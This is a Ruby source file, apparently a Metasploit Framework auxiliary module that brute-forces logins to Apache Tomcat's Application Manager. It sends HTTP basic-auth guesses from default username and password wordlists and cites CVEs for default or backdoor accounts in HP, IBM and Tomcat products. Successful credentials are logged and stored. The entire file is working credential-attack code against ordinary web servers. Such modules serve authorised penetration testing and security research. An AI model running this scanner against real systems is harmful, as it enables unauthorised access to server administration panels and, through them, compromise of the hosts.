##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'           => 'Tomcat Application Manager Login Utility',
            'Description'    => 'This module simply attempts to login to a Tomcat Application Manager instance using a specific user/pass.',
            'References'     =>
                [
                    # HP Default Operations Manager user/pass
                    [ 'CVE', '2009-3843' ],
                    [ 'OSVDB', '60317' ],
                    [ 'BID', '37086' ],
                    [ 'CVE', '2009-4189' ],
                    [ 'OSVDB', '60670' ],
                    [ 'URL', 'http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html' ],
                    [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-085/' ],

                    # HP Default Operations Dashboard user/pass
                    [ 'CVE', '2009-4188' ],

                    # IBM Cognos Express Default user/pass
                    [ 'BID', '38084' ],
                    [ 'CVE', '2010-0557' ],
                    [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179' ],

                    # IBM Rational Quality Manager and Test Lab Manager
                    [ 'CVE', '2010-4094' ],
                    [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-214/' ],

                    # 'admin' password is blank in default Windows installer
                    [ 'CVE', '2009-3548' ],
                    [ 'OSVDB', '60176' ],
                    [ 'BID', '36954' ],

                    # General
                    [ 'URL', 'http://tomcat.apache.org/' ],
                    [ 'CVE', '1999-0502'] # Weak password
                ],
            'Author'         => [ 'MC', 'Matteo Cantoni <goony[at]nothink.org>', 'jduck' ],
            'License'        => MSF_LICENSE
        )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('URI', [true, "URI for Manager login. Default is /manager/html", "/manager/html"]),
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_pass.txt") ]),
      ], self.class)

    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888, 9080, 19300 ])
  end

  def run_host(ip)
    begin
      uri = normalize_uri(datastore['URI'])
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
        'username' => Rex::Text.rand_text_alpha(8)
        }, 25)
      http_fingerprint({ :response => res })
    rescue ::Rex::ConnectionError => e
      vprint_error("http://#{rhost}:#{rport}#{uri} - #{e}")
      return
    end

    if not res
      vprint_error("http://#{rhost}:#{rport}#{uri} - No response")
      return
    end
    if res.code != 401
      vprint_error("http://#{rhost}:#{rport} - Authorization not requested")
      return
    end

    each_user_pass { |user, pass|
      do_login(user, pass)
    }
  end

  def do_login(user='tomcat', pass='tomcat')
    vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' with password:'#{pass}'")
    success = false
    srvhdr = '?'
    uri = normalize_uri(datastore['URI'])
    begin
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
        'username' => user,
        'password' => pass
        }, 25)
      unless (res.kind_of? Rex::Proto::Http::Response)
        vprint_error("http://#{rhost}:#{rport}#{uri} not responding")
        return :abort
      end
      return :abort if (res.code == 404)
      srvhdr = res.headers['Server']
      if res.code == 200
        # Could go with res.headers['Server'] =~ /Apache-Coyote/i
        # as well but that seems like an element someone's more
        # likely to change
        success = true if(res.body.scan(/Tomcat/i).size >= 5)
        success
      end

    rescue ::Rex::ConnectionError => e
      vprint_error("http://#{rhost}:#{rport}#{uri} - #{e}")
      return :abort
    end

    if success
      print_good("http://#{rhost}:#{rport}#{uri} [#{srvhdr}] [Tomcat Application Manager] successful login '#{user}' : '#{pass}'")
      report_auth_info(
        :host => rhost,
        :port => rport,
        :sname => (ssl ? 'https' : 'http'),
        :user => user,
        :pass => pass,
        :proof => "WEBAPP=\"Tomcat Application Manager\"",
        :source_type => "user_supplied",
        :duplicate_ok => true,
        :active => true
      )

      return :next_user
    else
      vprint_error("http://#{rhost}:#{rport}#{uri} [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'")
      return
    end
  end
end
